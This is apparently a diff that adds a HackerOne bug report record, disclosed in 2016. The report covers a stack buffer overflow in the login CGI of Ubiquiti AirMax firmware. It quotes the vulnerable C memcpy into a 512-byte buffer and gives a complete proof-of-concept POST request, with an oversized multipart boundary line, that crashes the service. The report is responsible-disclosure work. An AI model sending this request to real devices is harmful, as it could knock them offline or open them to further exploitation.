@@ -1,0 +1,103 @@
+{
+  "id": 74025,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDAyNQ==",
+  "url": "https://hackerone.com/reports/74025",
+  "title": "Yet another Buffer Overflow in PHP of the AirMax Products",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-07-05T17:04:12.735Z",
+  "submitted_at": "2015-07-05T17:04:12.735Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rbran",
+    "url": "/rbran",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-04-07T22:00:33.249Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-03-08T22:00:21.616Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "It's me again!\r\n\r\nAfter the Report [#73491](https://hackerone.com/reports/73491) and the [#74004](https://hackerone.com/reports/74004), I bring another Buffer Overflow, this one look more like #74004, which is a overflow in stack.\r\n\r\nHas you can see bellow, is copied to the var `line` a content (POST data in this case) which can go beyond the content of the original variable. \r\n```\r\nint ub_process_content(struct upload_buffer* ub)\r\n{\r\n\tchar  line[512];\r\n\tsize_t length;\r\n\t\r\n/** some code **/\r\n\t\tif ((~ub->got) & GOT_BOUNDARY) {\r\n\t\t\teol = (char*)memmem(ptr, size, \"\\r\\n\", 2);\r\n\t\t\tif (!eol) break;\r\n\r\n\t\t\tlength = eol - ptr + 2;\r\n\t\t\tmemcpy(line, ptr, length); //!!Problem!!//\r\n\t\t\tline[length] = 0;\r\n\r\n\t/** some code **/\r\n}\r\n```\r\n\r\nAll what we need its a line with more than 512 bytes, example of request:\r\n```\r\nPOST /login.cgi HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: curl/7.43.0\r\nAccept: */*\r\nContent-Length: 700\r\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\r\n\r\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\r\nContent-Disposition: form-data; name=\"file\"; filename=\"AAA\"\r\nContent-Type: application/octet-stream\r\n\r\nAAAA\r\n--------------------------2ad2f036dd647428--\r\n```\r\n\r\nWhen the var `ptr` point to the first line (of the POST content) it will have more the 512  bytes until \"\\r\\n\" and will overflow  the var `line`. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report #74004.\r\n\r\nSorry if I'am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. ",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-04-07T22:00:21.953Z",
+  "allow_singular_disclosure_after": -247758148.3721807,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "shivammusic",
+    "dyabla",
+    "prowser"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
